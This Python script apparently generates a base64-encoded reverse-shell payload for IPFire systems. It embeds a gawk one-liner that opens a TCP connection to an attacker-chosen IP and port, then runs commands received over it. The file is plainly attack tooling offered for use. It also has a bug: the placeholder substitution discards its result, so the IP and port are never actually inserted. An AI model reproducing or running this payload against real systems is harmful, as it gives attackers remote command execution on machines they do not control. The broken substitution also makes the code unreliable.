#GENERATOR ENCODED PAYLOAD TO MAKE AN REVERSE-SHELL WITH IPFIRE
#NEED PYTHON3

import base64

ip = "127.0.0.1" #CHANGE THIS
port = "4444" #CHANGE THIS

payload = """
	awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
	"""

#CONFIGURE PAYLOAD
def payload_prepare(ip, port, payload):
	payload.replace("<IP>", ip)
	payload.replace("<PORT>", port)

	return payload


#ENCODE B64 PAYLOAD
def b64_encode(payload):
	data = payload
	bytes = base64.b64encode(data.encode("utf-8"))
	payload_encoded = str(bytes, "utf-8")
	return (payload_encoded)

#ADD THE BACKSLASH TO THE B64 PAYLOAD
def add_back(exploit):
	it = 0
	exploit_b64 = " "
	for i in exploit:
		if(it == 64):
			exploit_b64 += "\\n" + str(i)
			it = 1
		else:
			it += 1
			exploit_b64 += str(i)

	return(exploit_b64)


send_payload = payload_prepare(ip, port, payload)
b64_payload = b64_encode(send_payload)
b64_payload_back = add_back(b64_payload)

print(b64_payload_back)


